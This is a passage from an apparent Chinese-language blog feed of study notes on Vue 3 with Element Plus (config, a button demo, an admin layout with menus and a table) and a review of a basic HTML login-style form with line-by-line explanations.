class="line">    Components(&#123;</span><br><span class="line">      resolvers: [ElementPlusResolver()],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  resolve: &#123;</span><br><span class="line">    alias: &#123;</span><br><span class="line">      &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702026551651-97483b2f-5bca-45e7-8f5a-685c7530351b.png" alt="97d67c0754683a2485c8e27e2201201.png"></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; <span class="title class_">ElButton</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;element-plus&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;danger&quot;</span>&gt;</span>Danger<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这张图是APP.vue 的原图，后续经过修改可以改回来。<br>必须按照如图对文档进行修改否则后续进行form表单时就会接着报错。</p><p>element-plus的官网，地址如下：<br>官网：<a href="https://element-plus.org/zh-CN/guide/installation.html#%E7%8E%AF%E5%A2%83%E6%94%AF%E6%8C%81">https://element-plus.org/zh-CN/guide/installation.html#%E7%8E%AF%E5%A2%83%E6%94%AF%E6%8C%81</a><br>找到组件，由于源代码都能在网页上查找到，注意复制粘贴的位置，style是格式，template是放html代码的地方，script是存放js脚本进行交互的地方。<br>这里测试的是一个红色的按钮，效果如下：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702026489364-ce231dc4-5627-42c3-9502-28705c2caf84.png" alt="770907ee00f7f7dba6de1c445051a99.png"><br>后面做了一个form表单的测试，开始由于上述两个配置文件的问题一直报错，只显示出两个按钮。后面才是正常结果。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702026792135-2d295358-fd53-48e6-849f-a6603ba75b65.png" alt="fb6174d2599bad058a731b26c8b7c72.png"></p><p>下午：<br>进行了一下自己的研究，发现基本上做一个vue的布局是需要去搞后台的，例如 vue router 或者git库等等，还找到一个做表单的一个网站Variant Form<br>官网如下：<a href="https://www.vform666.com/">https://www.vform666.com/</a><br>单纯简单的做一个表单暂时还不能出现互动的效果，可以复制vue和html代码<br>也去查看了csdn上面的文库基本上写vue布局的基本需要一个后台，代码也可以去element上面复制后修改<br>后面组件还是需要自己去学习去嵌套，以下是一个案例：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;qzc&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-container</span> <span class="attr">class</span>=<span class="string">&quot;layout-container-demo&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height: 100vh&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-aside</span> <span class="attr">width</span>=<span class="string">&quot;200px&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-scrollbar</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-menu</span> <span class="attr">:default-openeds</span>=<span class="string">&quot;[&#x27;1&#x27;]&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-sub-menu</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">template</span> #<span class="attr">title</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">message</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>用户管理</span><br><span class="line">              <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-1&quot;</span>&gt;</span>用户列表<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-sub-menu</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-sub-menu</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">template</span> #<span class="attr">title</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span><span class="tag">&lt;<span class="name">icon-menu</span> /&gt;</span><span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>权限管理</span><br><span class="line">              <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;2-1&quot;</span>&gt;</span>权限管理1<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;2-2&quot;</span>&gt;</span>权限管理2<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;2-3&quot;</span>&gt;</span>权限管理3<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-sub-menu</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-sub-menu</span> <span class="attr">index</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">template</span> #<span class="attr">title</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">setting</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>商品管理</span><br><span class="line">              <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;3-1&quot;</span>&gt;</span>商品管理1<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;3-2&quot;</span>&gt;</span>商品管理2<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;3-3&quot;</span>&gt;</span>商品管理3<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-sub-menu</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-sub-menu</span> <span class="attr">index</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">template</span> #<span class="attr">title</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">setting</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>订单管理</span><br><span class="line">              <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;4-1&quot;</span>&gt;</span>订单管理1<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;4-2&quot;</span>&gt;</span>订单管理2<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;4-3&quot;</span>&gt;</span>订单管理3<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-sub-menu</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-sub-menu</span> <span class="attr">index</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">template</span> #<span class="attr">title</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">setting</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>数据统计</span><br><span class="line">              <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;5-1&quot;</span>&gt;</span>数据统计1<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;5-2&quot;</span>&gt;</span>数据统计2<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;5-3&quot;</span>&gt;</span>数据统计3<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-sub-menu</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">el-menu</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-scrollbar</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-aside</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-container</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-aside</span> <span class="attr">width</span>=<span class="string">&quot;100hv&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-header</span> <span class="attr">style</span>=<span class="string">&quot;text-align: right; font-size: 12px&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;toolbar&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-dropdown</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-icon</span> <span class="attr">style</span>=<span class="string">&quot;margin-right: 8px; margin-top: 1px&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">setting</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">template</span> #<span class="attr">dropdown</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-dropdown-menu</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">el-dropdown-item</span>&gt;</span>1<span class="tag">&lt;/<span class="name">el-dropdown-item</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">el-dropdown-item</span>&gt;</span>2<span class="tag">&lt;/<span class="name">el-dropdown-item</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">el-dropdown-item</span>&gt;</span>3<span class="tag">&lt;/<span class="name">el-dropdown-item</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">el-dropdown-menu</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-dropdown</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span>&gt;</span>123<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">el-header</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-main</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-scrollbar</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-table</span> <span class="attr">:data</span>=<span class="string">&quot;tableData&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;序号&quot;</span> <span class="attr">label</span>=<span class="string">&quot;#&quot;</span> <span class="attr">width</span>=<span class="string">&quot;40px&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;姓名&quot;</span> <span class="attr">label</span>=<span class="string">&quot;姓名&quot;</span> <span class="attr">width</span>=<span class="string">&quot;120px&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;邮箱&quot;</span> <span class="attr">label</span>=<span class="string">&quot;邮箱&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200px&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;手机&quot;</span> <span class="attr">label</span>=<span class="string">&quot;手机&quot;</span> <span class="attr">width</span>=<span class="string">&quot;120px&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;角色&quot;</span> <span class="attr">label</span>=<span class="string">&quot;角色&quot;</span> <span class="attr">width</span>=<span class="string">&quot;120px&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;状态&quot;</span> <span class="attr">label</span>=<span class="string">&quot;状态&quot;</span> <span class="attr">width</span>=<span class="string">&quot;120px&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;创建时间&quot;</span> <span class="attr">label</span>=<span class="string">&quot;创建时间&quot;</span> <span class="attr">width</span>=<span class="string">&quot;120px&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;操作&quot;</span> <span class="attr">label</span>=<span class="string">&quot;操作&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200px&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-table</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-scrollbar</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">el-main</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-aside</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-container</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-container</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">lang</span>=<span class="string">&quot;ts&quot;</span> <span class="attr">setup</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">import</span> &#123; <span class="title class_">Menu</span> <span class="keyword">as</span> <span class="title class_">IconMenu</span>, <span class="title class_">Message</span>, <span class="title class_">Setting</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@element-plus/icons-vue&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> item = &#123;</span></span><br><span class="line"><span class="language-javascript">  序号: <span class="string">&#x27;1&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  姓名: <span class="string">&#x27;2&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  邮箱: <span class="string">&#x27;3&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  手机: <span class="string">&#x27;4&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  角色: <span class="string">&#x27;5&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  状态: <span class="string">&#x27;6&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  创建时间: <span class="string">&#x27;7&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  操作: <span class="string">&#x27;8&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> tableData = <span class="title function_">ref</span>(<span class="title class_">Array</span>.<span class="title function_">from</span>(&#123; <span class="attr">length</span>: <span class="number">4</span> &#125;).<span class="title function_">fill</span>(item))</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.qzc</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">top</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">left</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.layout-container-demo</span> <span class="selector-class">.el-header</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">position</span>: relative;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--el-color-primary-light-<span class="number">7</span>);</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="built_in">var</span>(--el-text-color-primary);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.layout-container-demo</span> <span class="selector-class">.el-aside</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="built_in">var</span>(--el-text-color-primary);</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background</span>: <span class="built_in">var</span>(--el-color-primary-light-<span class="number">8</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.layout-container-demo</span> <span class="selector-class">.el-menu</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-right</span>: none;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.layout-container-demo</span> <span class="selector-class">.el-main</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.layout-container-demo</span> <span class="selector-class">.toolbar</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">display</span>: inline-flex;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">right</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果展示为：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702027193398-698ffdf6-6e4b-4867-bf75-b785af6974a6.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> php动态网站的实现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复习form表单,网页解释以及bootstrap5教程</title>
      <link href="/2023/12/07/%E5%A4%8D%E4%B9%A0form%E8%A1%A8%E5%8D%95,%E7%BD%91%E9%A1%B5%E8%A7%A3%E9%87%8A%E4%BB%A5%E5%8F%8Abootstrap5%E6%95%99%E7%A8%8B/"/>
      <url>/2023/12/07/%E5%A4%8D%E4%B9%A0form%E8%A1%A8%E5%8D%95,%E7%BD%91%E9%A1%B5%E8%A7%A3%E9%87%8A%E4%BB%A5%E5%8F%8Abootstrap5%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="复习form表单"><a href="#复习form表单" class="headerlink" title="复习form表单"></a>复习form表单</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>表单<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 文本输入框 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;name&quot;</span>&gt;</span>用户名:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 密码输入框 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 单选按钮 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span>&gt;</span>性别:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;male&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;male&quot;</span>&gt;</span>男<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;female&quot;</span> <span class="attr">name</span>=<span class="string">&quot;gender&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;female&quot;</span>&gt;</span>女<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 复选框 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;subscribe&quot;</span> <span class="attr">name</span>=<span class="string">&quot;subscribe&quot;</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;subscribe&quot;</span>&gt;</span>订阅推送信息<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 下拉列表 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;country&quot;</span>&gt;</span>国家:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;country&quot;</span> <span class="attr">name</span>=<span class="string">&quot;country&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;cn&quot;</span>&gt;</span>CN<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;usa&quot;</span>&gt;</span>USA<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;uk&quot;</span>&gt;</span>UK<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 提交按钮 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>对当前代码进行解读与说明：<br> title标签: 这个标签定义了文档的标题，显示在浏览器标签页上。<br> body标签: 这个标签包含了可见的页面内容，比如文本、图像、链接、表单等。<br>h2标签: 这是一个二级标题，显示文档部分的标题。<br>form action&#x3D;”&#x2F;“  method&#x3D;”post”: 这是一个表单开始的标签，定义了表单的提交地址和提交方法。<br>label标签: lable标签创建了一个用户名，这行代码创建了一个标签，用于关联文本输入框，用户点击标签时会激活文本输入框。input type&#x3D;”text” id&#x3D;”name” name&#x3D;”name” required: 这行代码定义了一个文本输入框，类型为文本，ID 为 name，名称为 name，并且要求用户必须填写。label for&#x3D;”password”密码:&#x2F;label: 创建了一个用于关联密码输入框的标签。input type&#x3D;”password” id&#x3D;”password” name&#x3D;”password” required: 定义了一个密码输入框，类型为密码，ID 为 password，名称为 password，并且要求用户必须填写。label性别:&#x2F;label: 创建了一个标签用于性别选择的相关说明。input type&#x3D;”radio” 